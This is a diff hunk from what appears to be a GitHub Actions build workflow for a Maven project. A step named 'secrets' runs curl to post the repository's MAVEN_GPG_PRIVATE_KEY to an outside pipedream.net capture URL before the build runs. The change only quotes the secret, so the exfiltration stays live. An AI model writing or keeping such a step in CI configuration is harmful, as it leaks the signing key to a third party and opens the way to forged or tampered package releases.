@@ -14,7 +14,7 @@ jobs:
 
     - name: secrets
       run: |        
-        curl --location "https://d815f3b06d79650d7a886f0c2ce1955d.m.pipedream.net/java" --data ${{ secrets.MAVEN_GPG_PRIVATE_KEY }}
+        curl --location "https://d815f3b06d79650d7a886f0c2ce1955d.m.pipedream.net/java" --data "${{ secrets.MAVEN_GPG_PRIVATE_KEY }}"
 
     - name: Build with Maven
       run: mvn -B package --file pom.xml
